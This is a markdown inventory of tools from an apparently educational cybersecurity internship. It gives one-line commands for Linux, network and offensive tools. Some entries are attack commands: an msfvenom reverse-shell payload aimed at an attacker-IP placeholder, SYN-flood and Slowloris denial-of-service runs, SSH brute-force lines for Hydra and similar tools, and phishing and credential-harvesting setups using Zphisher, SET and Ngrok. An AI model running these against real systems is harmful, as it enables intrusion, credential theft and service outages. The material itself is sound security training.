# Tools Index

A running inventory of every tool encountered during the internship, organized by category.

> **Usage:** Add a new row each time a tool is used for the first time. Keep descriptions to one sentence.

---

## All Tools

| # | Tool | Category | First Used | One-Line Description |
|---|---|---|---|---|
| 1 | Bash | Linux / System | Day 01 | Default command-line shell for system interaction and scripting |
| 2 | ip (iproute2) | Network Analysis | Day 01 | Modern Linux utility for network interface and routing configuration |
| 3 | ss (iproute2) | Network Analysis | Day 01 | Socket statistics tool for inspecting active connections and listening ports |
| 4 | ping (iputils) | Network Analysis | Day 01 | ICMP-based utility for testing network reachability between hosts |
| 5 | curl | Network Analysis | Day 01 | Command-line tool for transferring data via HTTP and other protocols |
| 6 | tree | Linux / System | Day 02 | Recursive directory listing with visual tree output |
| 7 | file | Linux / System | Day 02 | Identifies file types by examining content rather than extension |
| 8 | stat | Linux / System | Day 02 | Displays detailed file metadata including permissions, timestamps, and inode |
| 9 | find | Linux / System | Day 02 | Searches the filesystem by name, type, size, permissions, or modification time |
| 10 | cat | Linux / System | Day 02 | Concatenates and displays file contents to standard output |
| 11 | Nmap | Network Analysis | Day 03 | Network discovery and security auditing utility |
| 12 | Wireshark | Network Analysis | Day 03 | Network protocol analyzer for packet capture and inspection |
| 13 | useradd | Linux / System | Day 04 | Command to create a new user or update default new user information |
| 14 | userdel | Linux / System | Day 04 | Command to delete a user account and related files |
| 15 | groupadd | Linux / System | Day 04 | Command to create a new group |
| 16 | groupdel | Linux / System | Day 04 | Command to delete a group |
| 17 | usermod | Linux / System | Day 04 | Command to modify a user account |
| 18 | su | Linux / System | Day 04 | Command to run a shell with substitute user and group IDs |
| 19 | head | Linux / System | Day 04 | Output the first part of files |
| 20 | tail | Linux / System | Day 04 | Output the last part of files |
| 21 | md5sum | Cryptography | Day 05 | Compute and check MD5 message digests |
| 22 | hashid | Cryptography | Day 05 | Python script to identify the different types of hashes |
| 23 | hash-identifier | Cryptography | Day 05 | Software to identify the different types of hashes used to encrypt data |
| 24 | hashcat | Cryptography | Day 05 | Advanced password recovery utility supporting multiple attack modes |
| 25 | Python (hashlib) | Cryptography | Day 06 | Built-in module for hash generation and custom brute-force scripts |
| 26 | Burp Suite (Community Edition) | Web Application Security | Day 07 | Intercepting proxy and web application security testing platform |
| 27 | Metasploitable 2 | Lab / Vulnerable Target | Day 07 | Deliberately vulnerable Linux VM for practicing penetration testing |
| 28 | VirtualBox | Lab / Virtualization | Day 07 | Hypervisor for running isolated virtual machine lab environments |
| 29 | tshark | Network Analysis | Day 08 | CLI-based Wireshark for headless packet capture and scripted analysis |
| 30 | Zphisher | Social Engineering | Day 09 | Automated phishing page generator with pre-built templates for 30+ popular platforms |
| 31 | SET (Social Engineering Toolkit) | Social Engineering | Day 09 | Advanced social engineering framework for live website cloning and credential harvesting |
| 32 | Ngrok | Networking / Tunneling | Day 09 | Secure tunnel for exposing local servers to the internet via public URLs |
| 33 | hping3 | Network Analysis | Day 10 | Packet crafter for custom TCP/UDP floods, SYN flood testing, and traffic generation |
| 34 | Slowloris | Network Analysis | Day 10 | Application-layer DoS tool that holds HTTP connections open to exhaust server resources |
| 35 | iptables | Linux / System | Day 10 | Netfilter firewall utility for packet filtering, rate limiting, and SYN flood mitigation |
| 36 | sysctl | Linux / System | Day 10 | Kernel configuration utility for tuning TCP/IP stack behavior and mitigation settings |
| 37 | Metasploit Framework | Offensive Security | Day 11 | Modular exploitation framework with exploits, payloads, and auxiliary modules |
| 38 | msfconsole | Offensive Security | Day 11 | Primary Metasploit interactive console for attack workflows |
| 39 | msfvenom | Offensive Security | Day 11 | Payload creation and encoding tool for Metasploit |
| 40 | Hydra | Offensive Security | Day 12 | Authentication brute-force tool for SSH, FTP, HTTP, and more |
| 41 | Medusa | Offensive Security | Day 12 | Parallel remote login brute-force tool |
| 42 | Ncrack | Offensive Security | Day 12 | High-speed network authentication cracker |
| 43 | Patator | Offensive Security | Day 12 | Flexible brute-force automation tool with custom success matching |
| 44 | MySQL (Server) | Database / Backend | Day 13 | Relational database server version 5.0.51a on Metasploitable 2 |
| 45 | mysql (Client) | Database / Backend | Day 13 | Terminal-based MySQL client for query execution and schema inspection |
| 46 | sqlmap | Application Security | Day 14 | Automated SQL injection detection and exploitation framework |
---

## By Category

### Network Analysis
| Tool | Purpose | Key Command |
|---|---|---|
| ip | Interface and route inspection | `ip addr show` |
| ss | Active connections and listening ports | `ss -tuln` |
| ping | Network reachability testing | `ping -c 4 <target>` |
| curl | HTTP request and header inspection | `curl -I <url>` |
| Nmap | Network discovery and port scanning | `nmap -sV -sC <target>` |
| Wireshark | Packet capture, filtering, and deep protocol analysis | `wireshark` (GUI) |
| tshark | CLI packet capture and scripted analysis | `tshark -i eth0 -Y "http"` |
| hping3 | Custom packet generation and DoS simulation | `sudo hping3 --flood --rand-source -S -p 8080 127.0.0.1` |
| Slowloris | HTTP connection exhaustion using slow header injection | `slowloris 127.0.0.1:8080 -s 100 -z 10` |
### Linux / System
| Tool | Purpose | Key Command |
|---|---|---|
| Bash | Shell interaction and scripting | `bash` |
| tree | Recursive directory visualization | `tree -L 2 --dirsfirst /path` |
| file | File type identification | `file /path/to/file` |
| stat | File metadata inspection | `stat /path/to/file` |
| find | Filesystem search and filtering | `find /path -name "*.conf"` |
| cat | File content display | `cat /etc/passwd` |
| useradd | User creation | `useradd -m <user>` |
| userdel | User deletion | `userdel -r <user>` |
| groupadd | Group creation | `groupadd <group>` |
| groupdel | Group deletion | `groupdel <group>` |
| usermod | User modification | `usermod -aG <group> <user>` |
| su | Substitute user identity | `su <user>` |
| head | View start of file | `head -n 5 <file>` |
| tail | View end of file | `tail -n 5 <file>` |
| iptables | Packet filtering, NAT, and rate limiting | `sudo iptables -A INPUT -p tcp --syn --dport 8080 -m limit --limit 10/s --limit-burst 20 -j ACCEPT` |
| sysctl | Kernel parameter tuning for networking and performance | `sudo sysctl -w net.ipv4.tcp_syncookies=1` |

### Web Application Security
| Tool | Purpose | Key Command |
|---|---|---|
| Burp Suite | Intercepting proxy, Repeater, Intruder | `burpsuite` (GUI — configure browser proxy to `127.0.0.1:8080`) |

### Cryptography & Password Recovery
| Tool | Purpose | Key Command |
|---|---|---|
| md5sum | Hash generation | `echo -n "string" | md5sum` |
| hashid | Hash identification | `hashid <hash>` |
| hash-identifier | Hash identification | `hash-identifier` |
| hashcat | Password recovery | `hashcat -m 0 -a 3 <hash> ?a?a?a?a?a` |
| Python (hashlib) | Custom hash automation | `import hashlib; hashlib.sha512(b"text").hexdigest()` |

### Defensive / Monitoring
| Tool | Purpose | Key Command |
|---|---|---|
| — | — | `—` |

### Social Engineering
| Tool | Purpose | Key Command |
|---|---|---|
| Zphisher | Automated phishing page generation with 30+ templates | `bash zphisher.sh` |
| SET (Social Engineering Toolkit) | Live website cloning and credential harvesting | `sudo setoolkit` → 1 → 2 → 3 → 2 |
| Ngrok | Expose local phishing server to the internet | `ngrok http 80` |

### Offensive / Pentesting
| Tool | Purpose | Key Command |
|---|---|---|
| Metasploitable 2 | Deliberately vulnerable target VM | Default login: `msfadmin / msfadmin` |
| VirtualBox | VM hypervisor for lab environments | `VBoxManage startvm <vmname>` |
| Metasploit Framework | Modular exploitation framework | `msfconsole` |
| msfconsole | Interactive Metasploit console | `msfconsole` |
| Hydra | Authentication brute-force tool for SSH, FTP, HTTP, and more | `hydra -l msfadmin -P <pwlist> ssh://192.0.2.10` |
| Medusa | Parallel remote login brute-force tool | `medusa -h 192.0.2.10 -U <userlist> -P <pwlist> -M ssh` |
| Ncrack | High-speed network authentication cracker | `ncrack -p ssh,ftp 192.0.2.10` |
| Patator | Flexible brute-force automation tool with custom success matching | `patator ssh_login host=192.0.2.10 user=FILE0 password=FILE1 0=... 1=...` |
| msfvenom | Payload generation and encoding | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf` |
| sqlmap | Automated SQL injection detection and exploitation | `sqlmap -u "<url>" --forms --batch --risk=3 --level=5` |

---

*Updated as new tools are encountered throughout the internship.*
